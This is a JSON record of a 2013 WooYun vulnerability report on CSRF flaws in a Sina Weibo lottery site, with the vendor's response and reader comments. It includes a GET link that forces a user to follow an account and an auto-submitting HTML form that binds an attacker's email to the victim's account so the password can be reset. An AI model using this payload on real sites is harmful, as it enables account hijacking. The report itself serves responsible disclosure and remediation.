{"id": 14423, "wybug_id": "wooyun-2013-017172", "wybug_title": "新浪微博还一处CSRF刷粉丝【非常严重】", "wybug_corp": "新浪微博", "wybug_author": "风萧萧", "wybug_date": "2013-01-10 16:09", "wybug_open_date": "2013-02-24 16:10", "wybug_type": "CSRF", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["漏洞利用", "利用技巧", "利用"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-01-10：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-01-10：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-01-20：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-01-30：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-02-09：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-02-24：\t细节向公众公开  简要描述： 1.加关注的接口POST变GET；2.不只是刷粉丝呢，xss可以偷身份，csrf同样可以的！ 详细说明：  1.是这个站点撒：http://caipiao.weibo.com,先登录，将信息填好撒！\n\n2.加关注的接口本来是一个POST请求的，结果我简单试了下，直接GET也可以撒，这个不能原谅哦，如下：\nhttp://w.aicai.com/ajaxCareFriend.do?uid=1981622273\n直接访问，再看看微博关注了谁吧：\n\n   漏洞证明：  3.再看另一个问题，CSRF绑定邮箱，再取回密码，进入【安全中心】：\n\n4.在邮箱那里，点击立即设置，填好事先准备的QQ邮箱：\n\n5.将该请求抓下，准备一个POST请求的POC页面，这个要是能GET，麻烦就大了：\n<html><body><form id=\"fengxiaoxiao\" name=\"fengxiaoxiao\" action=\"http://w.aicai.com/userEmail.do\" method=\"POST\"><input type=\"text\" name=\"email\" value=\"*********@qq.com\" /><input type=\"submit\" value=\"submit\" /></form><script>\tdocument.fengxiaoxiao.submit();</script></body></html>\n6.把链接发给指定的人撒，QQ邮箱来邮件了：\n\n7.用另一个微博账号点击上述链接，成功绑定！\n\n\n\n   修复方案：  1.CSRF要彻底检查下啊，不只是这两个地方；2.绑定邮箱的地方经实践证明，可以直接GET的，麻烦大了3.关键接口没有做用户验证，比如提示用户首先输入密码才可绑定邮箱或手机，哪怕设置一个图片验证码也可防止这种情况；4.礼物啊礼物！   版权声明：转载请注明来源 风萧萧@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：2  确认时间：2013-01-10 16:19 厂商回复： 多谢提供，此问题已经内部发现并通知了相关负责人进行修复。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-01-10 16:10 |    \t\tse55i0n \t\t\t( 普通白帽子  |\t\t\t        Rank:1567 漏洞数:173        )\t\t \n  @风萧萧 哈哈，新浪的童鞋要恨死你咯。。。    \n     2013-01-10 16:17 |    \t\t风萧萧  \t\t\t( 核心白帽子 |\t\t\t        Rank:1020 漏洞数:76        | 人这一辈子总要动真格的爱上什么人)\t\t \n  @se55i0n 别啊，免费测试漏洞，要感谢的哦！    \n     2013-01-10 16:38 |    \t\tse55i0n \t\t\t( 普通白帽子  |\t\t\t        Rank:1567 漏洞数:173        )\t\t \n  @风萧萧 基友，继续撸力，找回损失~ @新浪 rank给的不合理呀~    \n     2013-01-10 16:44 |    \t\t风萧萧  \t\t\t( 核心白帽子 |\t\t\t        Rank:1020 漏洞数:76        | 人这一辈子总要动真格的爱上什么人)\t\t \n  @se55i0n 新浪还是很靠谱的    \n     2013-01-10 16:46 |    \t\tse55i0n \t\t\t( 普通白帽子  |\t\t\t        Rank:1567 漏洞数:173        )\t\t \n  @风萧萧 何以见得？    \n     2013-01-10 17:05 |    \t\t风萧萧  \t\t\t( 核心白帽子 |\t\t\t        Rank:1020 漏洞数:76        | 人这一辈子总要动真格的爱上什么人)\t\t \n  @se55i0n 看另外两个洞    \n     2013-01-10 17:20 |    \t\t小胖胖要减肥  \t\t\t( 普通白帽子  |\t\t\t        Rank:686 漏洞数:101        )\t\t \n  @风萧萧 给你补了哈     \n     2013-01-10 22:40 |    \t\tRoyal. \t\t\t( 路人 |\t\t\t        Rank:27 漏洞数:8        )\t\t \n  ````2个jb····非常严重··    \n     2013-02-09 22:25 |    \t\t半世倾尘 \t\t\t( 路人 |\t\t\t        Rank:29 漏洞数:8        | 努力)\t\t \n  牛逼逼    \n     2013-05-06 13:47 |    \t\tHonker红颜 \t\t\t( 普通白帽子  |\t\t\t        Rank:156 漏洞数:51        | 皖南人士,90后宅男,自学成才,天朝教育失败....)\t\t \n  哈哈，送你礼物没有额    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 2, "Ranks": null}